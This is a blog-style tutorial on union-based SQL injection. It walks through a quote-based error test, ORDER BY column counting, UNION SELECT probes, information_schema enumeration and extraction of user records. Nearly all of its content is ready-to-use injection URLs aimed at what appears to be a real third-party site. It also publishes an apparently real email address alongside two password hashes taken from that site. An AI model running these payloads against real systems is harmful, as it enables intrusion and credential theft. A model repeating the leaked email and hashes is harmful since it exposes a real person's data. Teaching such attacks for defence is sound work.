---
title: "Union Based SQL Injection"
categories:
- OWASP Vulnerability
image:
  path: preview.png
layout: post
media_subpath: /assets/posts/2015-01-09-union-based-sql-injection
tags:
- SQL Injection
- Union based SQL Injection
- Error Based SQL Injection
- Ethical hacking
- Bug Bounty
- Application Security
- OWASP Top 10
---

## What is Union Based SQL Injection?

The attacker uses the UNION SQL operator to combine the results of a malicious query with the application's original query and retrieve data from other tables.

Through SQL injection attacker can read sensitive data, modify database, and get unauthorize access. SQL injection occurs when untrusted input is used to dynamically create SQL queries without proper input validation or secure query handling.

## Attack Scenario

To identified SQL injection, first step is to check whether the target URL is vulnerable to SQL injection. A common test is to insert a single quote `(')` into an input parameter. If the application is insecure, this unexpected character may cause the backend SQL query to fail, resulting in a database error message. Such errors can indicate that user input is being incorporated into SQL queries without proper handling, suggesting a potential SQL injection vulnerability.

In the target URL, we insert a single quote which break the backend query and received a error message.

![sql_error](sql_error.png)

```
Error: Warning: mysql_fetch_array() expects parameter 1 to be resource, boolean given in /home/megali5/public_html/cargo/whatsnew_details.php on line 5

```

If the application does not display a database error, it does not mean it is not vulnerable. Instead, observe the application's behavior for any unexpected changes, such as missing content, altered page layouts, missing images, etc. These differences may indicate that the application's response has been affected by the input, which can be a sign of a potential SQL injection vulnerability even when error messages are suppressed.

Next step is to fix this error, or this we use `"--+", "--", #` etc it depend on the backend query, it just comment the rest query. 

After patching error our objective is to find number of columns being used in the select statement, by using "ORDER BY" clause. Order by keyword is used to sort the result by one or more columns.

```
http://abcd.com.bn/cargo/whatsnew_details.php?id=32'+ORDER BY+1--+ (No error)
http://abcd.com.bn/cargo/whatsnew_details.php?id=32'+ORDER BY+2--+ (No error)
http://abcd.com.bn/cargo/whatsnew_details.php?id=32'+ORDER BY+3--+ (No error)
http://abcd.com.bn/cargo/whatsnew_details.php?id=32'+ORDER BY+4--+ (No error)
.
.
.
http://abcd.com.bn/cargo/whatsnew_details.php?id=32'+ORDER BY+6--+ (No error)

http://abcd.com.bn/cargo/whatsnew_details.php?id=32'+ORDER BY+7--+ (Error)

```

On ORDER BY 7 it shows error like previous one. This error means we will use "6" columns in our select statement.

![order_by](order_by.png)

Now find out which columns number are visible on web application by using UNION SELECT statement.

```
http://abcd.com.bn/cargo/whatsnew_details.php?id=32'+UNION+SELECT+1,2,3,4,5,6--+

```

![number_column](number_column.png)

Columns no "2" and "4"  are visible on web application, these columns are our target.

**Some time it does not shows any columns, in that case add `"-"` before id parameter value. ex.**

```
http://abcd.com.bn/cargo/whatsnew_details.php?id=-32'+UNION+SELECT+1,2,3,4,5,6--+

```

Now, first we will look for version, for this we will use `@@version`.

```
http://abcd.com.bn/cargo/whatsnew_details.php?id=32'+UNION+SELECT+ 1,@@version,3,4,5,6--+

```

![version.](version.png)

Check for database name for we use `database()`.

```
http://abcd.com.bn/cargo/whatsnew_details.php?id=32'+UNION+SELECT+1,database(),3,4,5,6--+

```

![database](database.png)

Now extract table name, for this use `information_schema`

```
http://abcd.com.bn/cargo/whatsnew_details.php?id=32'+UNION+SELECT +1,group_concat(table_name),3,4,5,6+from+information_schema.tables+where+ table_schema=database()--+

```

Here, GROUP_CONCAT function concatenates strings from a group into one string with various options.

![table_name](table_name.png)

Now, extract column name,

```
http://abcd.com.bn/cargo/whatsnew_details.php?id=32'+UNION+SELECT +1,group_concat(column_name),3,4,5,6+from+information_schema.columns+where+ table_name='g2_PendingUser'--+

```

![column_name](column_name.png)

Now extract username and password from column `g_email and g_hashedPassword`

```
http://abcd.com.bn/cargo/whatsnew_details.php?id=32'+UNION+SELECT +1,group_concat(
g_hashedPassword,0x2d,0x2d,g_email),3,4,5,6+from+g2_PendingUser--+

```

here 0x2d is hex value of `"-"`.

![password](password.png)

Here email id and password hash is 

```
JSh]4dbb33835fb01c9a775f7745911fd44e--she_sell@hotmail.com,
7ZW\8eaee83ba12b12856b3ea9066dcefccf--she_sell@hotmail.com

```



